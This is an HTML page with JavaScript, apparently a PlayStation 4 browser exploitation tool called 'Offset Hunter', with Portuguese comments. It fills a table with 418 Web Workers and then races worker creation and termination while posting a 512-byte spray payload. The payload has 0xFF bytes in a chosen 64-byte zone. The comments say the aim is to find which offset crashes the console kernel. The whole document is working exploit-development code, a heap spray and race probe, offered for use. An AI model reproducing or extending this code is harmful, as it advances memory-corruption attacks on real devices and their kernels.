<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 512 OFFSET HUNTER</title>
    <style>
        body { background-color: #111; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #f0f; text-shadow: 0 0 5px #f0f; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; max-width: 600px; margin: 20px auto; }
        button { 
            padding: 15px; font-size: 1.2em; background: #333; color: #fff; border: 1px solid #555; cursor: pointer;
            transition: all 0.2s;
        }
        button:hover { background: #f0f; color: #000; }
        button:active { transform: scale(0.95); }
        #status { font-size: 1.5em; margin: 20px; border: 1px solid #fff; padding: 10px; background: #000; }
        .ready { color: #0f0; border-color: #0f0 !important; }
        .firing { color: #f00; border-color: #f00 !important; animation: blink 0.1s infinite; }
        @keyframes blink { 0% {opacity:1} 50% {opacity:0.5} 100% {opacity:1} }
    </style>
</head>
<body>

    <h1>OFFSET HUNTER (512 Bytes)</h1>
    <div id="status">ESCOLHA UMA ZONA PARA ATACAR</div>

    <div class="grid">
        <button onclick="setupAttack(0)">ZONA 1 (Bytes 0-63)</button>
        <button onclick="setupAttack(64)">ZONA 2 (Bytes 64-127)</button>
        <button onclick="setupAttack(128)">ZONA 3 (Bytes 128-191)</button>
        <button onclick="setupAttack(192)">ZONA 4 (Bytes 192-255)</button>
        <button onclick="setupAttack(256)">ZONA 5 (Bytes 256-319)</button>
        <button onclick="setupAttack(320)">ZONA 6 (Bytes 320-383)</button>
        <button onclick="setupAttack(384)">ZONA 7 (Bytes 384-447)</button>
        <button onclick="setupAttack(448)">ZONA 8 (Bytes 448-511)</button>
    </div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_LIMIT = 418;  
        const SPRAY_SIZE = 512;
        
        let workers = [];
        let selectedOffset = -1;
        
        // Workers
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // Prepara o Payload Base (Zeros = Seguro)
        let basePayload = new Uint8Array(SPRAY_SIZE);
        basePayload.fill(0x00); 

        function setupAttack(offset) {
            selectedOffset = offset;
            
            // Cria um payload híbrido: ZEROS em tudo, mas LIXO (0xFF) na zona escolhida
            // Se o console crashar, é porque o kernel leu a zona com 0xFF
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); // Fundo seguro
            
            // Preenche a zona alvo com 0xFF (Valor agressivo)
            // 0xFF geralmente causa crash se lido como ponteiro ou flag
            for(let i=0; i<64; i++) {
                payload[offset + i] = 0xFF;
            }

            document.getElementById('status').innerText = `ENCHENDO TABELA... (Alvo: ${offset}-${offset+63})`;
            document.getElementById('status').className = "ready";
            
            startFill(payload);
        }

        function startFill(payload) {
            workers = []; // Limpa array anterior
            
            // Enche rápido até 418
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    // Espera 4s para estabilizar (Como aprendemos antes)
                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                    setTimeout(() => launchAttack(payload), 4000);
                }
            }, 30);
        }

        function launchAttack(payload) {
            const st = document.getElementById('status');
            st.innerText = `>>> ATACANDO ZONA ${selectedOffset} <<<`;
            st.className = "firing";

            // Loop de Spray + Race
            setInterval(() => {
                // 1. Cria e Mata (Abre buraco)
                const w = new Worker(killerUrl);
                w.terminate();
                
                // 2. Injeta o Payload Específico
                try {
                    if(workers.length > 0) {
                        workers[0].postMessage(payload);
                    }
                } catch(e){}
            }, 10);
        }

    </script>
</body>
</html>
